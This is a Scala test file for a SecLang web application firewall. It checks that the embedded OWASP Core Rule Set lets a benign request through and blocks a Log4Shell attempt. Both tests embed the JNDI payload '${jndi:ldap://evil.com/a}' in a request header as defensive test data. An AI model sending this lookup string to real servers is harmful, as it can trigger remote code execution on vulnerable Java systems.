package com.cloud.apim.seclang.coreruleset.tests


import munit.FunSuite

import java.util

class CRSTest extends FunSuite {
  test("crs scala") {

    import com.cloud.apim.seclang.model._
    import com.cloud.apim.seclang.scaladsl._
    import com.cloud.apim.seclang.scaladsl.coreruleset.EmbeddedCRSPreset

    val presets = Map(
      "crs" -> EmbeddedCRSPreset.embedded
    )
    val factory = SecLang.factory(presets)
    val engine = factory.engine(List(
      "@import_preset crs",
      "SecRuleEngine On"
    ))

    val passing_ctx = RequestContext(
      method = "GET",
      uri = "/",
      headers = Headers(Map(
        "Host" -> List("www.owasp.org"),
        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
      ))
    )
    val passing_res = engine.evaluate(passing_ctx, phases = List(1, 2)).displayPrintln()

    val failing_ctx = RequestContext(
      method = "GET",
      uri = "/",
      headers = Headers(Map(
        "Host" -> List("www.foo.bar"),
        "Apikey" -> List("${jndi:ldap://evil.com/a}"),
        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
      )),
      query = Map("q" -> List("test")),
      body = None
    )
    val failing_res = engine.evaluate(failing_ctx, phases = List(1, 2)).displayPrintln()

    assertEquals(passing_res.disposition, Disposition.Continue)
    assertEquals(failing_res.disposition, Disposition.Block(400, Some("Potential Remote Command Execution: Log4j / Log4shell"), Some(944150)))
  }

  test("crs java") {

    import com.cloud.apim.seclang.model._
    import com.cloud.apim.seclang.javadsl._
    import com.cloud.apim.seclang.javadsl.coreruleset.EmbeddedCRSPreset

    val presets = new util.HashMap[String, JSecLangPreset]()
    presets.put("crs", EmbeddedCRSPreset.embedded)

    val factory = SecLang.factory(presets)
    val engine = factory.engine(java.util.List.of(
      "@import_preset crs",
      "SecRuleEngine On",
    ))

    val passing_ctx = JRequestContext
      .builder()
      .method("GET")
      .uri("/")
      .header("Host", "www.owasp.org")
      .header("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
      .build()

    val passing_res = engine.evaluate(passing_ctx, java.util.List.of(1, 2)).displayPrintln()

    val failing_ctx = JRequestContext
      .builder()
      .method("GET")
      .uri("/")
      .header("Host", "www.owasp.org")
      .header("Apikey", "${jndi:ldap://evil.com/a}")
      .header("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
      .build()

    val failing_res = engine.evaluate(failing_ctx, java.util.List.of(1, 2)).displayPrintln()

    assertEquals(passing_res.getDisposition, JDisposition.continueRequest())
    assertEquals(failing_res.getDisposition, JDisposition.fromScala(Disposition.Block(400, Some("Potential Remote Command Execution: Log4j / Log4shell"), Some(944150))))
  }
}
